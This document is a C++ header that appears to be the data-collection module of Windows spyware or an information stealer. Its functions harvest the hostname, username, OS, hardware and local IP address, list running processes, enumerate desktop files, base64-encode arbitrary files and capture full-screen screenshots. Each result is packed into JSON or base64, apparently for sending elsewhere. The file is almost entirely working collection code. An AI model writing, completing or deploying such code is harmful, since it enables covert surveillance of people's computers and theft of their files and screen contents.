#pragma once
#include "crypt.hpp"
#include <winsock2.h>
#include <ws2tcpip.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <filesystem>
#include <fstream>
#include <nlohmann/json.hpp>
#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib,"gdi32.lib")
#pragma comment(lib,"gdiplus.lib")
#include <gdiplus.h>
namespace fs = std::filesystem;
using json = nlohmann::json;

inline json GrabSysInfo() {
    json j;
    char host[256]{}; DWORD sz=sizeof(host);
    GetComputerNameA(host, &sz); j["hostname"] = host;
    char user[256]{}; sz=sizeof(user);
    GetUserNameA(user, &sz); j["username"] = user;
    typedef NTSTATUS(WINAPI*RtlGetVer)(PRTL_OSVERSIONINFOW);
    RTL_OSVERSIONINFOW vi{}; vi.dwOSVersionInfoSize=sizeof(vi);
    auto fn=(RtlGetVer)GetProcAddress(GetModuleHandleA("ntdll.dll"),"RtlGetVersion");
    if(fn) fn(&vi);
    j["os"] = "Windows " + std::to_string(vi.dwMajorVersion) + "." + std::to_string(vi.dwMinorVersion)
              + " Build " + std::to_string(vi.dwBuildNumber);
    MEMORYSTATUSEX ms{}; ms.dwLength=sizeof(ms); GlobalMemoryStatusEx(&ms);
    j["ram_total_mb"] = ms.ullTotalPhys/1024/1024;
    j["ram_avail_mb"] = ms.ullAvailPhys/1024/1024;
    char cpu[64]{}; DWORD clen=sizeof(cpu);
    RegGetValueA(HKEY_LOCAL_MACHINE,
        "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
        "ProcessorNameString", RRF_RT_REG_SZ, nullptr, cpu, &clen);
    j["cpu"] = cpu;
    j["screen_w"] = GetSystemMetrics(SM_CXSCREEN);
    j["screen_h"] = GetSystemMetrics(SM_CYSCREEN);
    WSADATA wd{}; WSAStartup(MAKEWORD(2,2),&wd);
    char localHost[256]{}; gethostname(localHost,sizeof(localHost));
    auto* he = gethostbyname(localHost);
    if (he && he->h_addr_list[0]) {
        struct in_addr ia; memcpy(&ia, he->h_addr_list[0], sizeof(ia));
        j["local_ip"] = inet_ntoa(ia);
    }
    WSACleanup();
    return j;
}

inline json GrabProcesses() {
    json out = json::array();
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return out;
    PROCESSENTRY32W pe{}; pe.dwSize = sizeof(pe);
    if (Process32FirstW(snap, &pe)) {
        do {
            int sz = WideCharToMultiByte(CP_UTF8,0,pe.szExeFile,-1,nullptr,0,nullptr,nullptr);
            std::string name(sz-1,' ');
            WideCharToMultiByte(CP_UTF8,0,pe.szExeFile,-1,name.data(),sz,nullptr,nullptr);
            out.push_back({{"pid",(int)pe.th32ProcessID},{"name",name},
                           {"parent_pid",(int)pe.th32ParentProcessID}});
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return out;
}

inline json GrabDesktopFiles() {
    json out = json::array();
    wchar_t desk[MAX_PATH]{};
    SHGetFolderPathW(nullptr, CSIDL_DESKTOPDIRECTORY, nullptr, 0, desk);
    if (!fs::exists(desk)) return out;
    for (auto& e : fs::directory_iterator(fs::path(desk))) {
        auto& p = e.path();
        json f;
        int sz = WideCharToMultiByte(CP_UTF8,0,p.filename().c_str(),-1,nullptr,0,nullptr,nullptr);
        std::string name(sz-1,' ');
        WideCharToMultiByte(CP_UTF8,0,p.filename().c_str(),-1,name.data(),sz,nullptr,nullptr);
        f["name"]    = name;
        f["is_dir"]  = e.is_directory();
        if (e.is_regular_file()) { std::error_code ec; f["size"] = (int64_t)e.file_size(ec); }
        out.push_back(f);
    }
    return out;
}

inline std::string ReadFileB64(const fs::path& p) {
    std::ifstream f(p, std::ios::binary);
    std::string bytes((std::istreambuf_iterator<char>(f)), {});
    static const char* T = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string out; out.reserve(((bytes.size()+2)/3)*4);
    for (size_t i=0;i<bytes.size();i+=3) {
        uint32_t v = ((uint8_t)bytes[i]<<16)|((i+1<bytes.size()?(uint8_t)bytes[i+1]:0)<<8)|(i+2<bytes.size()?(uint8_t)bytes[i+2]:0);
        out+=T[(v>>18)&63]; out+=T[(v>>12)&63];
        out+=(i+1<bytes.size())?T[(v>>6)&63]:'=';
        out+=(i+2<bytes.size())?T[v&63]:'=';
    }
    return out;
}

inline std::string GrabScreenshot() {
    int W = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int H = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    int X = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int Y = GetSystemMetrics(SM_YVIRTUALSCREEN);

    HDC hScrDC = GetDC(nullptr);
    HDC hMemDC = CreateCompatibleDC(hScrDC);
    HBITMAP hBmp = CreateCompatibleBitmap(hScrDC, W, H);
    SelectObject(hMemDC, hBmp);
    BitBlt(hMemDC, 0, 0, W, H, hScrDC, X, Y, SRCCOPY);

    Gdiplus::GdiplusStartupInput gsi;
    ULONG_PTR tok;
    Gdiplus::GdiplusStartup(&tok, &gsi, nullptr);

    Gdiplus::Bitmap* bmp = Gdiplus::Bitmap::FromHBITMAP(hBmp, nullptr);
    IStream* stream = nullptr; CreateStreamOnHGlobal(nullptr, TRUE, &stream);

    UINT numEncoders=0, size=0;
    Gdiplus::GetImageEncodersSize(&numEncoders, &size);
    std::vector<uint8_t> buf(size);
    auto* encoders = (Gdiplus::ImageCodecInfo*)buf.data();
    Gdiplus::GetImageEncoders(numEncoders, size, encoders);
    CLSID pngClsid{};
    for (UINT i=0;i<numEncoders;i++) {
        std::wstring mime = encoders[i].MimeType;
        if (mime==L"image/png"){pngClsid=encoders[i].Clsid;break;}
    }
    bmp->Save(stream, &pngClsid, nullptr);
    delete bmp;
    Gdiplus::GdiplusShutdown(tok);

    HGLOBAL hg = nullptr; GetHGlobalFromStream(stream, &hg);
    SIZE_T dataSize = GlobalSize(hg);
    void* ptr = GlobalLock(hg);
    std::string rawPng((char*)ptr, dataSize);
    GlobalUnlock(hg);
    stream->Release();
    DeleteObject(hBmp); DeleteDC(hMemDC); ReleaseDC(nullptr, hScrDC);

    static const char* T2 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string out; out.reserve(((rawPng.size() + 2) / 3) * 4);
    for (size_t i = 0; i < rawPng.size(); i += 3) {
        uint32_t v = ((uint8_t)rawPng[i] << 16)
                   | ((i+1 < rawPng.size() ? (uint8_t)rawPng[i+1] : 0) << 8)
                   | ( i+2 < rawPng.size() ? (uint8_t)rawPng[i+2] : 0);
        out += T2[(v>>18)&63]; out += T2[(v>>12)&63];
        out += (i+1 < rawPng.size()) ? T2[(v>>6)&63] : '=';
        out += (i+2 < rawPng.size()) ? T2[v&63]      : '=';
    }
    return out;
}
